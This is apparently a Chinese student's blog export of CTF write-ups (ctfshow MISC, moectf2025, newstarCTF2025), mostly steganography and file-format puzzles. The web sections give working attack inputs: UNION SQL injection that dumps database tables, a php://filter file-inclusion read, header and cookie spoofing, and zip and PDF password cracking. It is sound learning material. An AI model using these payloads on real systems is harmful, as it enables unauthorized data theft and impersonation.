[{"title":"ctfshow-MISC入门","url":"/2025/08/05/ctfshow-MISC%E5%85%A5%E9%97%A8/","content":"\n前言：博客创建这么久了，是时候发点内容了。\n聊聊近况：由于本人大一极度摆烂，暑假里想学点东西提升自己。整个七月份除了搭建好我的个人博客便是到处学，实在是有点操之过急了，最后也是感觉啥都没学会。总而言之，还是静下心慢慢来吧。也是先通过学习ctf拓展自己的知识面。\n其实大一刚入学便了解了ctf，但也仅限于了解。\n那么从现在开始吧。😊😊😊\n\n图片篇（基础操作）misc1解压后即可获取flag。\nmisc2解压后获得txt文本文件，打开后发现是乱码，开头显示“塒NG”直接猜测是png格式。直接修改获得flag。放入编辑器查看发现确实是PNG格式。\nmisc3解压后得到bpg格式文件。搜索后得知：\n\nBPG（Better Portable Graphics，更好的可移植图形）是一种新的图像格式。它的目的是在质量或文件大小有问题时替换jpeg图像格式。\n\n并且需要使用查看器进行查看。（我这里使用的是bandiview）查看后即可获得flag。\nmisc4解压后得到六个.txt文件。丢进010 editor查看文件头，再分别对文件格式进行修改，六张图结合起来便得到flag。\n\n\n图片篇（信息附加）misc5首先，拿到图片告知我”there_is_no_flag_here“.老样子丢进010 editor。拉到最下方flag便出现了。\nmisc6方法同misc5，通过搜索栏搜索ctfshow关键词即可找到。\nmisc7过程和第六题一模一样。😳\nmisc8查看属性，放入编辑器都没发现什么，于是丢进kali，使用binwalk发现存在多个文件，再使用foremost分离得到flag。\nmisc9同第六题。\nmisc10同样使用binwalk。\nmisc11几次尝试以后发现不行，查看wp，得知多了一个IDAT块。接下来自己尝试。\n先使用pngcheck发现确实有两个IDAT块。接着放进tweakpng中删除第一个IDAT再保存，最后得出flag。\n\nPNG 文件中的 IDAT 块通常是经过 Zlib 压缩的。每个 IDAT 块有固定的最大长度限制，一般为 65524 字节。当当前 IDAT 块存储的数据达到这个最大长度时，后续的数据就会存储到新的 IDAT 块中，新的 IDAT 块会按照顺序紧跟在前面的 IDAT 块之后，直到所有图像数据存储完毕。\n\n在这题，第一个IDAT块有所异常，删除即可。\nmisc12方法同misc11，爆出一堆IDAT块，但是要删除哪些呢，看完wp后得知删除前八个。（困惑？）\nmisc13上述方法用完后发现不行，然后在编辑器中发现”ct¹f…s†hªoKw“字样。\n使用脚本：\na=&quot;631A74B96685738668AA6F4B77B07B216114655336A5655433346578612534DD38EF66AB35103195381F628237BA6545347C3254647E373A64E465F136FA66F5341E3107321D665438F1333239E9616C7D&quot;flag=&quot;&quot;for i in range(0,len(a),4):    hexStr=a[i:i+2]    flag+=chr(int(&quot;0x&quot;+hexStr,16))print(flag)\n\n输出flag\nmisc14使用binwalk发现藏有文件，提取不出来，foremost也无法提取，这里手动提取，搜索FF D8 FF文件头。获得flag。\nmisc15老样子010 editor\nmisc16binwalk分离即可\nmisc17没做出来，看的别人的wp。\n首先，使用zsteg。得到如下：\n\n显示有额外的3544字节在zlib流之后。\n之后我们提取出来。zsteg -e extradata:0 misc17.png &gt; flag.txt。发现文本中并没有flag\n随后binwalk分离一下，最后得到flag。\nmisc18题目提示flag在标题、作者、照相机和镜头型号里，考察查阅EXIF信息。\n这里直接使用exiftool查看或者查看属性都能得到。\nmisc19exiftool即可。\nmisc20exiftool一下。comment一行中有内容：”这图片也太难看了。来自：西替爱抚秀大括号西九七九六四必一诶易西爱抚零六易一弟七九西二一弟弟诶弟五九三易四二大括号“。也就是ctfshow{c97964b1aecf06e1d79c21ddad593e42}\nmisc21exiftool一下，题目提示：**flag在序号里。**有内容：”Serial Number  : 686578285826597329“，这一眼不是flag，于是尝试十六进制转ASCII码得到：hex(X&amp;Ys)。于是猜测与X,Y相关内容有关，刚好爆出的内容有。X Resolution : 3902939465；Y Resolution : 2371618619；X Position : 1082452817；Y Position : 2980145261。分别转换再拼接起来即可。\nmisc22没做出来，看完wp得知是thumbnail隐写。\n\n然后便得到一个荧光色的flag\nmisc23题目提示：flag在时间里。exiftool一下。\n（因提示关注到此行，然后便不知道干嘛了）查看wp后得知：先将时间转化为时间戳。得到如下：\n\n87486582226992376882156662245460377706\n\n接着转为为十六进制即可得到flag。\nmisc41这题蛮有意思，题目提示”H4ppy Apr1l F001’s D4y！“在编辑器中搜索F001,即可显示出flag。\n图片篇（文件结构）misc24题目提示：”flag在图片上面“。猜测要修改高度。修改后得到flag。\nmisc25依旧修改高度，但这次是png文件。\nmisc26依旧修改高度。并使用脚本获取正确高度值。\nimport binasciiimport struct   crcbp = open(&quot;misc26.png&quot;, &quot;rb&quot;).read()    #打开图片crc32frombp = int(crcbp[29:33].hex(),16)     #读取图片中的CRC校验值print(crc32frombp) for i in range(4000):                        #宽度1-4000进行枚举    for j in range(4000):                    #高度1-4000进行枚举        data = crcbp[12:16] + \\            struct.pack(&#x27;&gt;i&#x27;, i)+struct.pack(&#x27;&gt;i&#x27;, j)+crcbp[24:29]        crc32 = binascii.crc32(data) &amp; 0xffffffff        # print(crc32)        if(crc32 == crc32frombp):            #计算当图片大小为i:j时的CRC校验值，与图片中的CRC比较，当相同，则图片大小已经确定            print(i, j)            print(&#x27;hex:&#x27;, hex(i), hex(j))            exit(0)\n\n高度为0x25e，flag内容需结合高度。\nmisc27依旧修改高度。\nmisc28这次是gif图，注意要修改两处。\n\nmisc29由于是gif图这里可以修改11处得到flag。修改完后有一帧能得到flag。\nmisc30修改宽度的题。题目说正确的宽度是950，转换为十六进制是3B6.这里注意：\n\nBMP格式采用小端序存储数据：低位字节在前，高位字节在后。\n如PNG格式采用大端序存储数据：高位字节在前，低位字节在后。\n\n如下：\n\n","categories":["CTF"],"tags":["MISC","CTF"]},{"title":"我的第一篇博客","url":"/2025/07/23/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/","content":"我的第一篇博客经过我的不懈努力，我的个人博客终于也是上线了！耶✌✌✌\n","categories":["生活记录"],"tags":["生活记录"]},{"title":"moectf2025wp","url":"/2025/08/17/moectf2025wp/","content":"签到flag在提示里。\n安全杂项Misc入门指北直接搜索栏搜索”ctf”，拉到最下，发现：这里复制即可。\nPyjail 0flag位于环境变量中\n\nPyjail 1\nez_LSBlsb隐写，直接zsteg。\n然后再base64解码即可获得flag。\nez_锟斤拷????\n百度一下：锟斤拷是中文互联网环境中常见的乱码字符组合，主要由编码转换错误引发 。该现象多出现在GBK与Unicode编码系统兼容性不足的场景，表现为连续无意义的汉字排列，例如”锟届瀿锟斤拷”等形态。\n\n这里直接gpt写脚本转换一下。\na = &quot;锝嶏綇锝咃絻锝旓絾锝涳讥锝庯迹锛愶絼锛戯綁锝庯絿锛匡絿锝傦极锛匡紶锝庯激锛匡嫉锝旓絾锛匡紭锛匡紤锝擄伎锛旓綍锝庯紒锛侊絽锝楋綏锝楋綏锝濇伃鍠滀綘寰楀埌寮楁媺鏍煎悗闈㈠叏鏄敓鏂ゆ嫹閿熸枻鎷烽敓鏂ゆ嫹&quot;  # 你看到的乱码b = a.encode(&quot;gbk&quot;, errors=&quot;ignore&quot;).decode(&quot;utf-8&quot;, errors=&quot;ignore&quot;)print(b)\n\n得到flag：ｍｏｅｃｔｆ｛ＥｎＣ０ｄ１ｉｎｇ＿ｇｂＫ＿＠ｎＤ＿Ｕｔｆ＿８＿１ｓ＿４ｕｎ！！ｅｗｗｗｗ｝恭喜你得到弗拉格后面全昔斤拷锟斤拷锟斤拷。\n\n什么是半角字符:半角字符（Half-width Character）是指宽度为一个标准英文字符（1字节）的字符。\n\n直接脚本转换\na = &quot;锝嶏綇锝咃絻锝旓絾锝涳讥锝庯迹锛愶絼锛戯綁锝庯絿锛匡絿锝傦极锛匡紶锝庯激锛匡嫉锝旓絾锛匡紭锛匡紤锝擄伎锛旓綍锝庯紒锛侊絽锝楋綏锝楋綏锝濇伃鍠滀綘寰楀埌寮楁媺鏍煎悗闈㈠叏鏄敓鏂ゆ嫹閿熸枻鎷烽敓鏂ゆ嫹&quot;  # 你看到的乱码b = a.encode(&quot;gbk&quot;, errors=&quot;ignore&quot;).decode(&quot;utf-8&quot;, errors=&quot;ignore&quot;)print(b)import unicodedataflag = unicodedata.normalize(&quot;NFKC&quot;, b)print(flag)\n\n最后得到flag。\n\nweird_photoCRC校验改宽高\nimport binasciiimport struct   crcbp = open(&quot;.png&quot;, &quot;rb&quot;).read()    #打开图片crc32frombp = int(crcbp[29:33].hex(),16)     #读取图片中的CRC校验值print(crc32frombp) for i in range(4000):                        #宽度1-4000进行枚举    for j in range(4000):                    #高度1-4000进行枚举        data = crcbp[12:16] + \\            struct.pack(&#x27;&gt;i&#x27;, i)+struct.pack(&#x27;&gt;i&#x27;, j)+crcbp[24:29]        crc32 = binascii.crc32(data) &amp; 0xffffffff        # print(crc32)        if(crc32 == crc32frombp):            #计算当图片大小为i:j时的CRC校验值，与图片中的CRC比较，当相同，则图片大小已经确定            print(i, j)            print(&#x27;hex:&#x27;, hex(i), hex(j))            exit(0)\n\n\n\nSSTV解压后获得一个.wav文件。\n百度一下：慢扫描电视（Slow-scan television）是业余无线电爱好者的一种主要图片传输方法，慢扫描电视通过无线电传输和接收单色或彩色静态图片。\n接着搜索SSTV解码，我这里直接使用在线解码工具。\n\nencrypted_pdf这题是爆破pdf密码。\n文本文件里提示：\n\nI am so forgetful…So I will use a password that is simple enough.\n\n密码很简单。\n我便用pdfcrack进行爆破，但不知道对应字段，感觉很费时间，于是放弃。\n接着，改用kali自带的rockyou 字典进行爆破，最后得到密码。\n\n\nqwe123是一个弱密码\n\n接着打开pdf，便有flag了\n\n捂住一只耳结合题目，应该某一声道有内容，直接丢进Audacity。\n\n上面有异常，且是一长一短，盲猜摩斯密码。使用在线解码网站解码即可。\n\nEnchantment流量分析题，还没做过，尝试一下，边学边做吧。🙂\n使用wireshark，找到png图片的包。\n\n然后获取图片。\n\n然后搜索附魔台文字相关进行翻译。\n\nthe flag is belownow you havemastered enchanting\n\nez_ssl根据题目提示进行查阅：\n\nSSL（Secure Socket Layer）安全套接层是Netscape公司率先采用的网络安全协议。它是在传输通信协议（TCP&#x2F;IP）上实现的一种安全协议，采用公开密钥技术。SSL广泛支持各种类型的网络，同时提供三种基本的安全服务，它们都使用公开密钥技术。\n\n那么我们便知道，流量数据是被加密过的。\n查看流量包，右侧可见ssl.log字样。\n\n下方发现一些可疑数据\n\nCLIENT_RANDOM 5cc9d58e7bf72668c8c7ca13915b43530206bc57523a3dc06420f47291081bf70 3318cf82ad502316bfa204be096be19f297b0e5f680d81e462c39d0af53ab67b82d0e11b54db16dae81394cd9e9816e4CLIENT_RANDOM 523878d7689e894823485b8f32727c779f8605866423eab6f4cc16c9df1cfb33 3318cf82ad502316bfa204be096be19f297b0e5f680d81e462c39d0af53ab67b82d0e11b54db16dae81394cd9e9816e4CLIENT_RANDOM ccfba4dd12e374afd300f296b691e12b70f9d5f8be0458782887763c8a54626e 3318cf82ad502316bfa204be096be19f297b0e5f680d81e462c39d0af53ab67b82d0e11b54db16dae81394cd9e9816e4CLIENT_RANDOM c8e817f2efcee3be9290aa075919f50f329be997b124487d02a1850e48c4292d 3318cf82ad502316bfa204be096be19f297b0e5f680d81e462c39d0af53ab67b82d0e11b54db16dae81394cd9e9816e4\n\n应该是泄露的密钥，接着进行密钥导入。\n点击“编辑“，再选择”首选项“，选择”protocols“，找到”TLS“,\n打开wireshark，选择“编辑“，找到”首选项“,在(Pre)-Master-Secret-Log filename进行导入。然后我们便能看到，多了几个流量包。并发现了疑似zip文件，如下图\n\n提取出来，然后发现打不开，放到编辑器里面去，发现有真加密。\nZIP 文件结构最后有个 End of Central Directory (EOCD) 记录，其中有一个字段 ’comment‘，出题人常常在这里写提示信息。\n\nE5 AF 86 E7 A0 81 E4 B8 BA 37 E4 BD 8D E7 BA AF E6 95 B0 E5 AD 97\n\n16进制转utf8得到：\n\n密码为7位纯数字\n\n并且在尝试解压的过程中，也会有相应信息告诉我们密码是七位数字，如下所示：\n\n接着进行爆破：\n\n得到密码：6921682 \n然后将zip文件丢进kali进行解压。\nunzip -P 6921682 flag.zip\n\n发现解压不了。经查阅是压缩算法问题，于是改用7z解压\n7z x flag3.zip -p6921682\n\n得到相应文件\n\n最后进行Ook!解密即可获得flag。\n\nWebRepo题目给了一个WebRepo.webp，这个格式在线识别网站时识别不了的，遂用在线网站转换文件格式再识别，得到如下：\n\nok，那就用binwalk看一下，发现有一个7z压缩包，将它提取出来并解压获得一个.git文件，\n\n接着如下找到flag相关内容：\n\n接着执行：\ngit cat-file -p 03f7841506c9eec4690ba0de326f657732fcb5bc\n\n获得flag:moectf{B1NwA1K_ANd_g1t_R3seT-MaG1C}\nez_png题目提示：某些数据段的长短似乎不太协调。pngcheck一下：\n\n发现多个IDAT数据块，且有长度异常，在这里我尝试了许久，删除部分数据块，并不能爆出flag。emmm那就zsteg一下，结果发现有额外的数据存在。\n\nzsteg -e extradata:0 ez_png.png &gt; flag.txt\n\n提取出来，查看提取出的flag.txt文件，并分离。最终得到flag。\n\n万里挑一\n这题也是搞了好久终于搞定了。\n\n首先是一个压缩包套娃。通过脚本将密码写入字典\nimport zipfile, io, redef collect_passwords(zip_bytes, depth=0, pwlist=None):    with zipfile.ZipFile(io.BytesIO(zip_bytes)) as zf:        for name in zf.namelist():            data = zf.read(name)            # 如果是 zip 文件且未达到深度限制，递归处理            if name.endswith(&quot;.zip&quot;) and depth &lt; 3:                collect_passwords(data, depth+1, pwlist)            else:                try:                    text = data.decode(&quot;utf-8&quot;, errors=&quot;ignore&quot;)                    if text:                        # 查找所有小写字母和数字组合的20位字符串                        matches = re.findall(r&#x27;[a-z0-9]&#123;20&#125;&#x27;, text)                        for m in matches:                            pwlist.add(m)                except:                    passif __name__ == &quot;__main__&quot;:    with open(&quot;password.zip&quot;, &quot;rb&quot;) as f:        root = f.read()    pwset = set()    collect_passwords(root, pwlist=pwset)    with open(&quot;passwords.txt&quot;, &quot;w&quot;, encoding=&quot;utf-8&quot;) as f:        for pw in pwset:            f.write(pw + &quot;\\n&quot;)    print(f&quot;\\n[✔] 共提取 &#123;len(pwset)&#125; 个密码，已保存到 passwords.txt&quot;)\n\n接着爆破即可得到lock.zip的密码\n\n后面这个部分真的磨了很久\n\nflag.zip中有两个文件flag.txt,和明文.exe,这里是明文攻击，于是我便去查找有关的题解，但是并没有已知明文文件（这里也是思维定势了）\n\n实际上我们只需要获得一定字节的明文就行了\n\n压缩包里有文件明文.exe,这是一个Windows可执行程序。\nEXE 文件开头必然是固定头（PE 文件头）：\n\n4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00B8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00\n\n这里我们可以提取出来作为已知明文\nprintf &quot;\\x4D\\x5A\\x90\\x00\\x03\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\xFF\\xFF\\x00\\x00&quot; &gt; known.bin\n\n接着使用bkcrack\n\n这里获得三个密钥\n然后运行如下即可获得flag：\n./bkcrack -C ~/桌面/flag.zip -c flag.txt -k eec878a3 6808e48f 3aa41bd8 -d flag.txt.dec\n\nmoectf{Y0u_h4v3_cho5en_7h3_r1ght_z1pf1le!!uysdgfsad}\nWEB\n也是啥都不会边学边做吧。&#x2F;(ㄒoㄒ)&#x2F;~~\n\nWeb入门指北打开文本文件，全是字符，经查阅得知是JSFuck。\n\n一种仅使用 6 个字符（[, ], (, ), !, +）编写有效 JavaScript 代码的编码方式。它的原理是通过类型转换和 JavaScript 的弱类型特性，将字符拼凑成可执行的代码。\n\n控制台运行后即可得到flag。\n第一章 神秘的手镯查看源码即可\n第二章 初识金曦玄轨抓包即可，查看响应包,能看到flag明文。如下图所示：\n\n第三章 问剑石！篡天改命！改包发包即可。\n\n\nmoectf{gEt_POSt_Tr@nSM1SSI0n_1S-4-gO0d-m3thOD!!l118}\n第五章 打上门来！查阅后知道是，路径遍历漏洞。\n经过一些基本尝试后得到flag\n\nMoe笑传之猜猜爆js代码审计，在控制台中输入：\nrandomNumber=1\n\n选定随机数，输入“1”，即可获得flag。\n第四章金曦破禁与七绝傀儡阵一步步来，改包放包即可。\n本人是个懒逼，忘记截图了，这里直接放出通关的解答：\n\n第一关：守门傀儡·磐石一尊形如巨龟、背负厚重石甲的傀儡堵在通道入口，双目红光闪烁，散发着重如山岳的压迫感。其胸口核心处，一块玉板闪烁着微光，上书：”欲过此关，需诵真言，启吾心窍，示之以’秘钥’（xdsec）。”\nHDdss立刻取出破阵罗盘，神念沉入。傀儡周围，立刻浮现出清晰的金色玄轨流动。他”看”到，傀儡的核心禁制在等待一个特定的”玄轨真言”。结合玉板提示，”示之以秘钥”即需要将秘钥”xdsec”传递给傀儡。\n“真言起手式……应是’取’（GET）。”HDdss心中明悟，神念凝聚，通过罗盘构筑真言：\nGET &#x2F;?key&#x3D;xdsec HTTP&#x2F;1.1 Host: 磐石傀儡关键：使用GET方法，将参数key&#x3D;xdsec附加在路径之后真言发出！磐石傀儡核心光芒一闪，厚重的石甲缓缓移开，露出通道，一枚通关玉简悬浮而出。”第一关，过！”HDdss信心大增。\n第二关：织云傀儡·流风通道尽头，一尊形似仙鹤、身披流云纹路的傀儡轻盈悬浮，双翼微振，带起道道锋利风刃。其核心玉板：”吾慕织云，欲争魁首。以汝真言，告之宗门：’织云阁&#x3D;第一’。”\n提示明确需要传递”织云阁&#x3D;第一”这个信息。HDdss再次驱动罗盘探查玄轨，发现此傀儡的禁制核心更倾向于接收”深藏”的真言本意（Body），而非显露于外的路径参数。且信息中包含中文！\n“需用’呈’（POST）之法，真言本意深藏，并以’转生符’（URL编码）化之！”HDdss迅速判断。他回忆K皇所授，意念凝聚，构筑真言：\nPOST &#x2F;declare HTTP&#x2F;1.1 Host: 织云傀儡 Content-Type: application&#x2F;x-www-form-urlencoded %E7%BB%87%E4%BA%91%E9%98%81%3D%E7%AC%AC%E4%B8%80关键：使用POST方法；设置Content-Type为表单编码；Body部分将”织云阁&#x3D;第一”进行URL编码：%E7%BB%87%E4%BA%91%E9%98%81&#x3D;织云阁，%3D&#x3D;&#x3D;，%E7%AC%AC%E4%B8%80&#x3D;第一真言发出！织云傀儡发出一声清唳，周身风刃消散，流云纹路光芒流转，显得极为愉悦。第二枚玉简落下。\n第三关：溯源傀儡·匿影此关傀儡形如鬼魅，身形飘忽不定，仿佛融入阴影。玉板提示：”非吾同源，难近吾身。唯’本地之灵’，方得信任。”\n“本地之灵？”HDdss皱眉。K皇曾提过”本我溯源”（X-Forwarded-For）敕令可伪装源头！此关之意，是要求真言必须看起来像是从”本地”（127.0.0.1）发出的！\n他立刻构筑真言，并在敕令（Headers）中加入关键伪装：\nGET &#x2F;trusted HTTP&#x2F;1.1 Host: 溯源傀儡 X-Forwarded-For: 127.0.0.1关键：在Headers中添加X-Forwarded-For: 127.0.0.1，伪装请求来源为本地真言发出！匿影傀儡身形一滞，仿佛确认了什么，缓缓退入阴影，让开通道。第三枚玉简浮现。\n第四关：器灵傀儡·辨微一尊通体由精密水晶构成的傀儡，无数光点在体内流转，如同审视万物的眼睛。玉板：”吾识万灵，唯爱’萌物’。非’萌灵之器’，拒之门外。”\n“萌物？萌灵之器？”HDdss略一思索，想起K皇提过的”器灵之证”（User-Agent）。此关要求，必须使用特定的、被傀儡识别为”萌物”的浏览器（如moe browser）发出的请求！\n他驱动罗盘，模拟修改敕令：\nGET &#x2F;access HTTP&#x2F;1.1 Host: 器灵傀儡 User-Agent: moe browser关键：修改User-Agent Header为moe browser，伪装成特定浏览器访问真言发出！水晶傀儡体内光点欢快地跳跃，发出悦耳的叮咚声，让开道路。第四枚玉简入手。\n第五关：心印傀儡·窃玉此关傀儡身着华服，面容模糊，手持一枚不断变幻的令牌。玉板：”吾持心印，变幻莫测。欲破此关，以’xt’之名，攻吾之隙！”\n“‘以xt之名’！”HDdss瞳孔一缩。这分明是暗示要窃取或冒充xt长老的身份印记！K皇所授的”心印之痕”（Cookie）正是关键！他需要找到xt长老在此傀儡禁制中留下的身份”Cookie”，并将其篡改为xt！\n他先用罗盘正常发出一个探查请求（GET &#x2F;），观察傀儡的回应（Response）。在回应的敕令（Headers）中，果然发现一行：Set-Cookie: user&#x3D;HDdss; Path&#x3D;&#x2F;这显然是傀儡根据他的核心弟子令牌临时赋予的身份印记（Cookie），当前用户是HDdss。\n“需要将后续请求中的这个user值，改为’xt’！”HDdss立刻构筑攻击真言：\nGET &#x2F;attack HTTP&#x2F;1.1 Host: 心印傀儡 Cookie: user&#x3D;xt关键：在后续请求的Headers中，携带修改后的Cookie：user&#x3D;xt，冒充xt的身份真言发出！心印傀儡手中的令牌瞬间定格，华服身影一阵扭曲模糊，发出不甘的嘶鸣，随即僵立不动。第五枚玉简落下。HDdss心中凛然，这”心印之痕”果然至关重要，可窃取身份，行僭越之事！\n第六关：前尘傀儡·引路一尊背负巨大书简的傀儡，书简上无数光字流转。玉板：”无根之木，无源之水。汝从何来？需有’引路之证’。”\n“引路之证？从何而来？”HDdss立刻联想到”前尘引路”（Referer）敕令。此关要求，发出的真言必须包含”引路之证”，即标明这个请求是从哪个”前站”（页面&#x2F;URL）链接或跳转过来的！\n他推测，只有标明是从某个特定地方（比如第一关的入口）来的请求，才会被认可。他尝试构筑真言：\nGET &#x2F;pass HTTP&#x2F;1.1 Host: 前尘傀儡 Referer: http:&#x2F;&#x2F;磐石傀儡&#x2F;entry关键：在Headers中添加Referer字段，指明请求来源是”磐石傀儡的入口”真言发出！书简傀儡背上的光字停止流转，组合成一道光门。第六枚玉简从中飞出。\n第七关：逆转傀儡·归墟最后一关，傀儡造型最为古朴，如同一个巨大的青铜鼎炉，炉口幽深，仿佛能吞噬一切。玉板只有一句晦涩真言：”阴阳逆乱，归墟可填。以’覆’代’取’，塑吾新生。”\n“‘覆’代’取’？”HDdss凝神思索。K皇所授方法中，”取”（GET）是获取，”呈”（POST）是提交，”覆”（PUT）则常用于更新或替换整个资源！此关之意，是要求使用不常用的”PUT”方法，去完成某种”覆盖”或”塑造”的操作！\n他驱动罗盘，仔细探查鼎炉傀儡的玄轨。发现其核心禁制对标准的GET&#x2F;POST真言毫无反应，仿佛在等待一种特定的、更具”覆盖性”的指令。\n“就是’覆’（PUT）！”HDdss下定决心，构筑真言：\nPUT &#x2F;rebirth HTTP&#x2F;1.1 Host: 逆转傀儡 Content-Type: text&#x2F;plain 新生！关键：使用PUT方法；简单设置Content-Type；在Body中传递一个象征”新生”的信息真言发出！青铜鼎炉剧烈震动，炉口幽光爆发，随即缓缓收敛平息，鼎身浮现出玄奥的符文。一枚比其他六枚更加璀璨、蕴含着丝丝空间波动的玉简缓缓升起。七绝傀儡阵，通关！\nHDdss长舒一口气，额角已见汗珠。连续七关，每一关都需要精准理解禁制意图，并运用对应的”金曦破禁真言”进行修改或构造，心神消耗巨大。但收获同样巨大！他对”玄轨真言”的结构、各敕令的妙用、以及不同方法（GET&#x2F;POST&#x2F;PUT）的差异，有了更深切、更实战化的理解，这远比枯坐听讲领悟深刻百倍！\n收起七枚玉简，尤其是那枚空间波动最强的第七关玉简，HDdss转身离开七绝傀儡阵。他知道，这枚玉简不仅是通关凭证，更可能指向下一个任务或机缘。手腕上，K皇的虚影悄然浮现，带着一丝嘉许：”孺子可教。金曦破禁，已得三分真味。然此术浩瀚，日后更需勤修不辍。这’归墟玉简’……或许与老夫所需之’引魂玉’线索有关。且回听竹小筑，细细参研。”\n流云峰上，竹影婆娑。HDdss的身影消失在通往听竹小筑的青石小径上，心中充满了对更高境界的渴望和对未知线索的期待。金曦破禁之术，将成为他在仙门立足、探寻K皇过往、乃至攀登更高峰的利器。而玄天剑宗的暗流，似乎也随着他在傀儡阵中的表现，开始悄然涌动。\n\n最后还要进行一步base64解码\nmoectf{C0n6r47u14710n5_y0ur_h77P_l3v3l_15_r34lly_h19h!}\n第六章 藏经禁制？玄机初探！最最最基础的sql注入。\n\n第七章 灵蛛探穴与阴阳双生符\n\n以上代码需要两个条件：\n\n值不相等\n有相等的MD5哈希值\n\n\n第八章 天衍真言，星图显圣这题考联合注入，以下是我的步骤：\n?username=&#x27; or 1=1 --+&amp;password=\n\n回显了Welcome admin，说明注入成功。\n?username=&#x27; or 1=1 order by 2 --+&amp;password=\n\n判断列数为两列。（union注入前后列数需相同）\n?username=-1&#x27; union select 1,2 --+&amp;password=\n\n接着判断注入点在1位置上。\n?username=-1&#x27; union select schema_name,2 from information_schema.schemata--+&amp;password=\n\n查询数据库名：information_schema\n?username=-1&#x27; union select group_concat(table_name),2 from information_schema.tables where table_schema=database()--+&amp;password=\n\n接着查询表名，并且回显出flag，users两表\n?username=-1&#x27; union select group_concat(column_name),2 from information_schema.columns where table_schema=database()--+&amp;password=\n\n接着查询字段名，回显value，username，password，三列。\n?username=-1&#x27; union select value,2 from flag--+&amp;password=\n\n最后查询value即可获得flag\n第十章 天机符阵经过大量的搜索查询后得知是XXE漏洞，方法如下\n\n第十章 天机符阵_revenge同XXE漏洞,方法如下\n\n第十一章 千机变·破妄之眼题目说：GET 参数名由m,n,o,p,q这五个字母组成（每个字母出现且仅出现一次），长度正好为 5，虽然不清楚字母的具体顺序，但是他知道参数名等于参数值才能进入。\n也就是有5×4×3×2×1&#x3D;120种，让gpt写个脚本爆破一下\n# -*- coding: utf-8 -*-import itertoolsimport requests# ==========================# 配置区# ==========================url = &quot;http://127.0.0.1:45657/&quot;  # &lt;-- 把这里改成目标 URLletters = &quot;mnopq&quot;             # 参数字母timeout = 5                   # 请求超时时间（秒）# ==========================# 爆破逻辑# ==========================for perm in itertools.permutations(letters):    param_name = &quot;&quot;.join(perm)    param_value = param_name    params = &#123;param_name: param_value&#125;    try:        response = requests.get(url, params=params, timeout=timeout)        content = response.text.lower()                # 判断是否成功返回 flag，可以根据实际网页内容调整判断条件        if &quot;flag&quot; in content or &quot;success&quot; in content:            print(f&quot;[+] 成功！URL: &#123;response.url&#125;&quot;)            print(f&quot;[+] 返回内容:\\n&#123;response.text&#125;&quot;)            break        else:            print(f&quot;[-] 尝试 &#123;param_name&#125; 失败&quot;)    except requests.exceptions.RequestException as e:        print(f&quot;[!] 请求 &#123;param_name&#125; 出错: &#123;e&#125;&quot;)\n\n最后成功返回URL: http://127.0.0.1:45657/find.php\n此题是一道文件包含漏洞的题。\n接着使用PHP内置伪协议将内容以base64形式输出\n&#x2F;find.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php\n最后的到\n\nPD9waHANCmVjaG8gImZsYWflsLHlnKjov5nkuobvvIznnIvkuI3liLDlkJfvvIzmmK/ogIHlvJ/looPnlYzkuI3lpJ/lkKciOw0KLy9tb2VjdGZ7MzdmNTFlNjAtZmJjOC0zYWM0LTIwNjUtMWNiNDNmOTc1M2JlfQ==\n\n","categories":["ctf"],"tags":["ctf"]},{"title":"newstarCTF2025_week1(web and misc)","url":"/2025/10/14/newstarCTF2025-week1-web-and-misc/","content":"Webmulti-headach3访问&#x2F;robots.txt，接着访问&#x2F;hidden.php，但是重定向了，查看相应头，得到flag。\n\n宇宙的中心是php抓个包发现路径&#x2F;s3kret.php\n&lt;?phphighlight_file(__FILE__);include &quot;flag.php&quot;;if(isset($_POST[&#x27;newstar2025&#x27;]))&#123;    $answer = $_POST[&#x27;newstar2025&#x27;];    if(intval($answer)!=47&amp;&amp;intval($answer,0)==47)&#123;        echo $flag;    &#125;else&#123;        echo &quot;你还未参透奥秘&quot;;    &#125;&#125;\n\n\nintval() 是 PHP 中用于获取变量整数值的函数，它可以将各种类型的值转换为整数。(将不同进制转换为十进制整数)。intval($answer,0)，当 intval() 的第二个参数设置为 0 时，函数会根据字符串的格式自动检测进制。\n\n&lt;?php$tests = [&#x27;47&#x27;, &#x27;047&#x27;, &#x27;0x2f&#x27;, &#x27;0X2F&#x27;, &#x27;0b101111&#x27;];foreach($tests as $t)&#123;    echo $t,&quot; =&gt; intval=&quot;,    intval($t),    &quot;  intval(,0)=&quot;,    intval($t,0),    PHP_EOL;&#125;\n\n0x2f满足条件\nhackbar提交即可获得flag。\n别笑你也过不了第二关score = 1000000;currentLevel = 1;endLevel();//控制台中输入\n\n我真得控制你了抓包后让ai来审计前端代码，有保护层，书签绕过\njavascript:(function()&#123;document.getElementById(&#x27;shieldOverlay&#x27;)?.remove();document.getElementById(%27accessButton%27).disabled=false;document.getElementById(%27accessButton%27).classList.add(%27active%27);&#125;)()\n\nai解析：\n\njavascript: 协议\n\njavascript:代码内容\n\n\n这是浏览器支持的特殊协议\n允许在地址栏或书签中直接执行JavaScript代码\n相当于在当前页面注入并执行脚本\n\n\n立即执行函数\n\njavascript\n(function()&#123; ... &#125;)()\n\n\n创建一个匿名函数并立即执行\n避免污染全局作用域\n\n\n移除保护层\n\njavascript\ndocument.getElementById(&#x27;shieldOverlay&#x27;)?.remove();\n\n\n?. 是可选链操作符，如果元素存在才执行remove()\n直接删除遮挡的DOM元素\n\n\n启用按钮\n\njavascript\ndocument.getElementById(&#x27;accessButton&#x27;).disabled = false;document.getElementById(&#x27;accessButton&#x27;).classList.add(&#x27;active&#x27;);\n\n\n移除按钮的禁用状态\n添加激活样式类\n\n接着，下一关弱口令爆破即可，获得密码。\n\n接着\n&lt;?phperror_reporting(0);function generate_dynamic_flag($secret) &#123;    return getenv(&quot;ICQ_FLAG&quot;) ?: &#x27;default_flag&#x27;;&#125;if (isset($_GET[&#x27;newstar&#x27;])) &#123;    $input = $_GET[&#x27;newstar&#x27;];        if (is_array($input)) &#123;        die(&quot;恭喜掌握新姿势&quot;);    &#125;        if (preg_match(&#x27;/[^\\d*\\/~()\\s]/&#x27;, $input)) &#123;        die(&quot;老套路了，行不行啊&quot;);    &#125;        if (preg_match(&#x27;/^[\\d\\s]+$/&#x27;, $input)) &#123;        die(&quot;请输入有效的表达式&quot;);    &#125; 